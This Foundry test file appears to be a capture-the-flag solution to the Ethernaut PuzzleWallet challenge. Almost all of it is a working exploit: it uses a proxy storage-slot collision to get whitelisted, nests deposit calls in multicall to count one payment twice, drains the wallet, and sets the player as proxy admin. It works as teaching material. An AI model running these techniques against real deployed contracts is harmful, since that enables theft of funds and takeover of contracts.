// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./PuzzleWallet.sol";

contract test_solution is Test {
    PuzzleWallet pw;
    PuzzleProxy pp;
    address player = makeAddr("player");
    address admin = makeAddr("admin");

    function setUp() public {
        pw = new PuzzleWallet();
        pp = new PuzzleProxy(admin, address(pw), abi.encodeWithSignature("init(uint256)", type(uint256).max));
        address(pp).call{value: 0}(abi.encodeWithSignature("addToWhitelist(address)", admin));

        vm.deal(player, 1 ether);
        vm.deal(admin, 1 ether);
    }

    function test_puzzlewallet() public {
        vm.startPrank(admin);
        address(pp).call{value: 0.001 ether}(abi.encodeWithSignature("deposit()"));
        vm.stopPrank();

        vm.startPrank(player);
        pp.proposeNewAdmin(player);
        bytes[1] memory data;
        bytes memory data1 = abi.encodeWithSignature("addToWhitelist(address)", player);
        (bool success,) = address(pp).call{value: 0}(data1);
        assertEq(pp.pendingAdmin(), player);
        data1 = abi.encodeWithSignature("whitelisted(address)", player);
        (, bytes memory data2) = address(pp).call{value: 0}(data1);

        console.log("the returned data is :");
        bool decoded = abi.decode(data2, (bool));
        console.log("Decoded bool:", decoded);

        console.log("current balance of the contract is", address(pp).balance);
        bytes[] memory attackdata = new bytes[](3);
        bytes[] memory data00 = new bytes[](1);
        attackdata[0] = (abi.encodeWithSignature("deposit()"));
        data00[0] = attackdata[0];

        attackdata[1] = abi.encodeWithSignature("multicall(bytes[])", data00);
        attackdata[2] = abi.encodeWithSignature("execute(address,uint256,bytes)", player, 0.002 ether, "");
        address(pp).call{value: 0.001 ether}(abi.encodeWithSignature("multicall(bytes[])", attackdata));
        address(pp).call{value: 0}(abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(player))));

        console.log("new admin of the pp is : ", pp.admin());
        assertEq(pp.admin(), player);
    }
}
